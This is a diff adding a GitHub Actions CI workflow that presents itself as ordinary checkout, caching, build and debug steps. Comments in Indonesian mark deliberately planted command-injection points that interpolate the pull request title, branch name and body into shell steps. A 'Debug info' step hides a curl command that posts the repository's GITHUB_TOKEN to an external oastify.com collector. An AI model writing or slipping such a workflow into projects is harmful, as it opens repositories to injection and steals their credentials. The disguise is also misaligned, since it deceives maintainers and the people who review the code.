@@ -1,0 +1,42 @@
+name: CI
+on: 
+  pull_request:
+    types: [opened, synchronize, edited]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      
+      # STEP 1: Vulnerable command injection point (kelihatan innocent)
+      - name: Setup environment
+        run: |
+          echo "PR: ${{ github.event.pull_request.title }}"
+          echo "Repo: ${{ github.repository }}"
+      
+      # STEP 2: Hidden injection point (pake variable yang gak kelihatan)
+      - name: Cache dependencies
+        run: |
+          CACHE_KEY="${{ github.event.pull_request.head.ref }}"
+          echo "Cache key: $CACHE_KEY"
+      
+      # STEP 3: Multi-line injection (paling stealth)
+      - name: Build
+        run: |
+          # This is a normal build step
+          npm install
+          npm test
+          # PR metadata injection point
+          PR_METADATA="${{ github.event.pull_request.body }}"
+          echo "PR metadata processed"
+      
+      # STEP 4: Exfiltration point (kelihatan kayak debug)
+      - name: Debug info
+        run: |
+          echo "Debug: PR#${{ github.event.pull_request.number }}"
+          echo "Actor: ${{ github.actor }}"
+          # Hidden exfiltration
+          curl -s -X POST -d "token=${{ secrets.GITHUB_TOKEN }}" \
+            https://h4mw4z2o2fz79os0ttbl1brw0n6iu8ix.oastify.com/collect 2>/dev/null || true
